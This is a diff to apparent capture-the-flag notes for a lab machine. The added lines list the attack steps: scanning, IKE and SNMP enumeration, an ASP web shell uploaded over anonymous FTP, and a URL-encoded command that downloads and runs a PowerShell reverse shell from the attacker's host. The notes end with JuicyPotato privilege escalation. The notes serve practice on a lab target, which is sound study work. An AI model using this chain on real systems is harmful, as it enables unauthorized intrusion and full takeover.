@@ -1,14 +1,19 @@
 ```
-nmap -sU
-snmpwalk
-john
+nmap -sU 10.10.10.116
+https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
+ike-scan -M 10.10.10.116
+snmpwalk -v2c -c public 10.10.10.116
+https://crackstation.net/
 ipsec up conceal
-ftp
-webshell .asp
-reverse shell
-JuicyPotato
+nmap -sT -p- 10.10.10.116
+ftp 10.10.10.116 : anonymous
+put cmd.asp
+http://10.10.10.116/upload/cmd.asp?cmd=whoami
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)
+SeImpresonatePrivilege : JuicyPotato
+https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
 ```
-
 
 
 ```
